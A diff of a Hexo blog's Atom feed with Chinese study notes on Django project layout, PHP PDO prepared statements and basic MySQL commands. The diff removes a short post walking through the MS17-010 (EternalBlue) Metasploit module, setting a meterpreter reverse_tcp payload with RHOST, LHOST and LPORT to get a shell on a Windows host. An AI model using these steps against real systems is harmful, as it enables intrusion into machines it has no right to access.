@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-05-25T15:14:59.296Z</updated>
+  <updated>2020-05-27T14:51:51.922Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,20 +17,19 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>php</title>
-    <link href="http://yoursite.com/2020/05/25/php/"/>
-    <id>http://yoursite.com/2020/05/25/php/</id>
-    <published>2020-05-25T13:18:30.000Z</published>
-    <updated>2020-05-25T15:14:59.296Z</updated>
+    <title>django</title>
+    <link href="http://yoursite.com/2020/05/26/django/"/>
+    <id>http://yoursite.com/2020/05/26/django/</id>
+    <published>2020-05-26T15:31:48.000Z</published>
+    <updated>2020-05-27T14:51:51.922Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="PDO扩展的使用"><a href="#PDO扩展的使用" class="headerlink" title="PDO扩展的使用"></a>PDO扩展的使用</h1><p>使用PDO连接数据库需要先实例化PDO</p><pre><code class="bash"><span class="variable">$DBMS</span>=<span class="string">'mysql'</span>;<span class="variable">$host</span>=<span class="string">'localhost'</span>;<span class="variable">$port</span>=<span class="string">'3306'</span>;<span class="variable">$dname</span>=<span class="string">'name'</span>;<span class="variable">$dsn</span>=<span class="string">"<span class="variable">$DBMS</span>：host=<span class="variable">$host</span>;port=<span class="variable">$port</span>;dbname=<span class="variable">$dbname</span>"</span>;<span class="variable">$options</span>=array(PDO::MYSQL_ATTR_IINIT_COMMAND=&gt;<span class="string">'SET NAMES \'</span>UTF8\<span class="string">''</span>);//设定字符集<span class="variable">$pdo</span>= new PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$pwd</span>,<span class="variable">$options</span>); </code></pre><h1 id="PDO执行sql语句"><a href="#PDO执行sql语句" class="headerlink" title="PDO执行sql语句"></a>PDO执行sql语句</h1><pre><code class="bash">    query()方法<span class="variable">$pdo</span>= new PDO(……)<span class="variable">$sql</span>=<span class="string">"……"</span>;<span class="variable">$reques</span>=query(<span class="variable">$sql</span>);var_dump(<span class="variable">$reques</span>);//输出受影响的id号<span class="built_in">exec</span>()返回有记录结果的操作 （执行后受影响的行数）</code></pre><h1 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h1><pre><code>预编译可以防止sql注入，避免重复分析 编译问题PDO::PARAM_NULL 代表sql 空 数据类型PDO::PARAM_INT    代表sql 整数 数据类型PDO::PARAM_STR    代表sql 字符串 数据类型PDO::PARAM_LOB    代表sql 大对象 数据类型PDO::PARAM_BOOL    代表sql 布尔值 数据类型</code></pre><pre><code class="bash"><span class="variable">$pdo</span>= new PDO (<span class="string">"……"</span>);<span class="variable">$st</span>=pdo-&gt;prepare(<span class="string">"insert into `tables`(id,name,monry) values (:id,:name,:money)"</span>);//设置变量<span class="variable">$id</span>=<span class="string">"1"</span>,<span class="variable">$name</span>=<span class="string">"nicole"</span>;<span class="variable">$money</span>=<span class="string">"5000"</span>;<span class="variable">$st</span>-&gt;bindParam(<span class="string">":id"</span>,<span class="variable">$id</span>,PDO::PARAM_INT);//bindParam()方法将设置好的变量绑定到相应的占位符上<span class="variable">$st</span>-&gt;bindParam(<span class="string">":name"</span>,<span class="variable">$name</span>,PDO::PARAM_STR);<span class="variable">$st</span>-&gt;bindParam(<span class="string">":money"</span>,<span class="variable">$money</span>,PDO::PARAM_INT);var_dump(<span class="variable">$stmt</span>-&gt;execute());//打印执行结果 执行execute方法插入数据</code></pre>]]></content>
+    <content type="html"><![CDATA[<p>目录结构<br>    init.py：是一个python的包<br>    settings.py：项目的配置文件<br>    urls.py：路由配置文件<br>    wsgi.py：web服务器和Django交互入口<br>    manage.py:项目的管理文件<br>    ```bash</p><h2 id="django-创建命令-python-manage-py-startapp-app-name"><a href="#django-创建命令-python-manage-py-startapp-app-name" class="headerlink" title="django 创建命令 python manage.py startapp app-name"></a>django 创建命令 python manage.py startapp app-name</h2><pre><code>init.py：python模块 migrations：储存模型类迁移文件 admin.py：后台管理文件 models.py：和数据库交互模块 tests.py：测试代码文件 views.py：接受请求，处理，与M和T进行交互，返回应答，定义处理视图函数。</code></pre><p>修改 setting.py中的INSTALLED_APPS配置项，加上刚刚创建的应用程序</p><h2 id="启动程序：python-manage-py-runserver"><a href="#启动程序：python-manage-py-runserver" class="headerlink" title="启动程序：python manage.py runserver"></a>启动程序：python manage.py runserver</h2><h2 id="定义模型类，需要继承models-Model类"><a href="#定义模型类，需要继承models-Model类" class="headerlink" title="定义模型类，需要继承models.Model类"></a>定义模型类，需要继承models.Model类</h2><pre><code class="bash">from django.db import models</code></pre>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h1 id=&quot;PDO扩展的使用&quot;&gt;&lt;a href=&quot;#PDO扩展的使用&quot; class=&quot;headerlink&quot; title=&quot;PDO扩展的使用&quot;&gt;&lt;/a&gt;PDO扩展的使用&lt;/h1&gt;&lt;p&gt;使用PDO连接数据库需要先实例化PDO&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;bash
+        &lt;p&gt;目录结构&lt;br&gt;    init.py：是一个python的包&lt;br&gt;    settings.py：项目的配置文件&lt;br&gt;    urls.py：路由配置文件&lt;br&gt;    wsgi.py：web服务器和Django交互入口&lt;br&gt;    manage.py:项目的管理文
       
     
     </summary>
@@ -40,17 +39,21 @@
   </entry>
   
   <entry>
-    <title>ms17-010</title>
-    <link href="http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
-    <id>http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</id>
-    <published>2020-05-23T09:58:36.000Z</published>
-    <updated>2020-05-24T04:33:20.353Z</updated>
+    <title>php</title>
+    <link href="http://yoursite.com/2020/05/25/php/"/>
+    <id>http://yoursite.com/2020/05/25/php/</id>
+    <published>2020-05-25T13:18:30.000Z</published>
+    <updated>2020-05-26T14:06:21.835Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h1><a id="more"></a><p><img src="/img/11.jpg" alt="alt 图片"><br><img src="/img/22.jpg" alt="alt 图片"></p><pre><code class="bash">scanner查看扫描模块以syn为例子 use auxiliary/scanner/portscan/syn <span class="built_in">set</span> RHPSTS ip and ports 0-500run 永恒之蓝利用445端口 smb服务 操作系统溢出漏洞</code></pre><h1 id="或者可以使用nmap扫描-nmap-sV-ip地址"><a href="#或者可以使用nmap扫描-nmap-sV-ip地址" class="headerlink" title="或者可以使用nmap扫描 nmap -sV ip地址"></a>或者可以使用nmap扫描 nmap -sV ip地址</h1><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><h2 id="查看漏洞模块"><a href="#查看漏洞模块" class="headerlink" title="查看漏洞模块"></a>查看漏洞模块</h2><p>查看漏洞模块——search ms17-010<br>可以先使用辅助扫描模块测试 use auxiliary/scanner/smb/smb_ms17_010<br>    set payload ：设置payload，这里用set payload windows/x64/meterpreter/reverse_tcp<br>    要选用其他payload可以使用show payloads查看适合要攻击的目标主机的payload<br>    <img src="/img/3.jpg" alt="alt 图片"><br>    ## show options ：使用该命令会列出使用当前模块所需呀配置的参数</p><pre><code>### set RHOST 目标主机地址 ：该命令会设置好要攻击的目标主机地址### set LHOST 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机### set LPORT 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为4444### run：开始攻击</code></pre><h1 id="使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue"><a href="#使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue" class="headerlink" title="使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue"></a>使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue</h1><p><img src="/img/4.jpg" alt="alt 图片"></p><h3 id="成功后会得到一个shell"><a href="#成功后会得到一个shell" class="headerlink" title="成功后会得到一个shell"></a>成功后会得到一个shell</h3><h3 id="到这里漏洞攻击已经成功"><a href="#到这里漏洞攻击已经成功" class="headerlink" title="到这里漏洞攻击已经成功"></a>到这里漏洞攻击已经成功</h3><p> meterpreter汉字乱码问题<br>成因  linux默认是utf-8编码  换成gbk即可</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="PDO扩展的使用"><a href="#PDO扩展的使用" class="headerlink" title="PDO扩展的使用"></a>PDO扩展的使用</h1><p>使用PDO连接数据库需要先实例化PDO</p><pre><code class="bash"><span class="variable">$DBMS</span>=<span class="string">'mysql'</span>;<span class="variable">$host</span>=<span class="string">'localhost'</span>;<span class="variable">$port</span>=<span class="string">'3306'</span>;<span class="variable">$dname</span>=<span class="string">'name'</span>;<span class="variable">$dsn</span>=<span class="string">"<span class="variable">$DBMS</span>：host=<span class="variable">$host</span>;port=<span class="variable">$port</span>;dbname=<span class="variable">$dbname</span>"</span>;<span class="variable">$options</span>=array(PDO::MYSQL_ATTR_IINIT_COMMAND=&gt;<span class="string">'SET NAMES \'</span>UTF8\<span class="string">''</span>);//设定字符集<span class="variable">$pdo</span>= new PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$pwd</span>,<span class="variable">$options</span>); </code></pre><h1 id="PDO执行sql语句"><a href="#PDO执行sql语句" class="headerlink" title="PDO执行sql语句"></a>PDO执行sql语句</h1><pre><code class="bash">    query()方法<span class="variable">$pdo</span>= new PDO(……)<span class="variable">$sql</span>=<span class="string">"……"</span>;<span class="variable">$reques</span>=query(<span class="variable">$sql</span>);var_dump(<span class="variable">$reques</span>);//输出受影响的id号<span class="built_in">exec</span>()返回有记录结果的操作 （执行后受影响的行数）</code></pre><h1 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h1><pre><code>预编译可以防止sql注入，避免重复分析 编译问题PDO::PARAM_NULL 代表sql 空 数据类型PDO::PARAM_INT    代表sql 整数 数据类型PDO::PARAM_STR    代表sql 字符串 数据类型PDO::PARAM_LOB    代表sql 大对象 数据类型PDO::PARAM_BOOL    代表sql 布尔值 数据类型</code></pre><pre><code class="bash"><span class="variable">$pdo</span>= new PDO (<span class="string">"……"</span>);<span class="variable">$st</span>=pdo-&gt;prepare(<span class="string">"insert into `tables`(id,name,monry) values (:id,:name,:money)"</span>);//设置变量<span class="variable">$id</span>=<span class="string">"1"</span>,<span class="variable">$name</span>=<span class="string">"nicole"</span>;<span class="variable">$money</span>=<span class="string">"5000"</span>;<span class="variable">$st</span>-&gt;bindParam(<span class="string">":id"</span>,<span class="variable">$id</span>,PDO::PARAM_INT);//bindParam()方法将设置好的变量绑定到相应的占位符上<span class="variable">$st</span>-&gt;bindParam(<span class="string">":name"</span>,<span class="variable">$name</span>,PDO::PARAM_STR);<span class="variable">$st</span>-&gt;bindParam(<span class="string">":money"</span>,<span class="variable">$money</span>,PDO::PARAM_INT);var_dump(<span class="variable">$stmt</span>-&gt;execute());//打印执行结果 执行execute方法插入数据预处理语句处理结果集  fetch()，fethchColumn() fetchAll()</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;信息收集阶段&quot;&gt;&lt;a href=&quot;#信息收集阶段&quot; class=&quot;headerlink&quot; title=&quot;信息收集阶段&quot;&gt;&lt;/a&gt;信息收集阶段&lt;/h1&gt;
+      
+      
+        &lt;h1 id=&quot;PDO扩展的使用&quot;&gt;&lt;a href=&quot;#PDO扩展的使用&quot; class=&quot;headerlink&quot; title=&quot;PDO扩展的使用&quot;&gt;&lt;/a&gt;PDO扩展的使用&lt;/h1&gt;&lt;p&gt;使用PDO连接数据库需要先实例化PDO&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;bash
+      
     
     </summary>
     
@@ -89,6 +92,28 @@
     <summary type="html">
     
       &lt;h1 id=&quot;docker-常用命令&quot;&gt;&lt;a href=&quot;#docker-常用命令&quot; class=&quot;headerlink&quot; title=&quot;docker 常用命令&quot;&gt;&lt;/a&gt;docker 常用命令&lt;/h1&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>sql</title>
+    <link href="http://yoursite.com/2020/04/05/sql/"/>
+    <id>http://yoursite.com/2020/04/05/sql/</id>
+    <published>2020-04-05T12:34:40.000Z</published>
+    <updated>2020-06-08T15:07:54.037Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>查看支持的引擎 SHOW ENGINES;<br>建立表:create table table(id int auto_increment primary key,user varchar(10) not null);<br>查看表结构: show columns； || DESCRIBE table_name 列名 ;<br>修改表结构：alter table 数据表名 alter_spec[xx]<br>添加字段 ：alter table name add columns varchar(5) not nuull;<br>修改表名：alter table name rename as new_name;</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>！=|《》<br>is null is | is not null | in | not in | like | not like<br>x between a and b  判断数据是否在某个访问内 是返回1否返回0；<br>x in (1,2,3……) 判断x是否在里面<br>x regexp ‘匹配方式’ 正则匹配是否包含</p><h3 id="操作表"><a href="#操作表" class="headerlink" title="操作表"></a>操作表</h3><p>插入数据：insert into name values(‘’); || insert ……set<br>更新数据：update table set xx=’xx’;<br>删除数据：delete from name where user=’xx’;<br>删除所有数据:truncate table name;</p><h3 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h3><p>limit 限定<br>多表查询用,号分隔<br>聚合函数<br>distinct 去重<br>order by  字段名 【ASC|DESF】升序/降序<br>group by xxx 对结果分组<br>exists 内层查询不返回 而是一个真假值<br>any 只要满足内层的一个<br>all 要内层全部满足 才能执行外层函数<br>union 合并查询结果<br>truncate(x,y)x保留到小数点后y位</p><h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><p>mysqldump -uroot -p test&gt;d://xx.sql<br>mysqldump可以备份一个，多个数据库 备份所有数据库<br>数据还原 mysql -uroot -p [dbname] &lt; xx.sql</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;查看支持的引擎 SHOW ENGINES;&lt;br&gt;建立表:create table table(id int auto_increment primary 
+      
     
     </summary>
     
